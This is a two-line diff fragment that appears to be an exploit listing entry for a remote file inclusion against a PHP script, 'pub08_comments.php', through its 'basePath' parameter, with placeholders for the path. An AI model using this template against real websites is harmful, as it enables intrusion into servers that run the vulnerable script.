@@ -1,0 +1,2 @@
+[path] [exploit]
+/      teatro/pub/pub08_comments.php?basePath=[path]
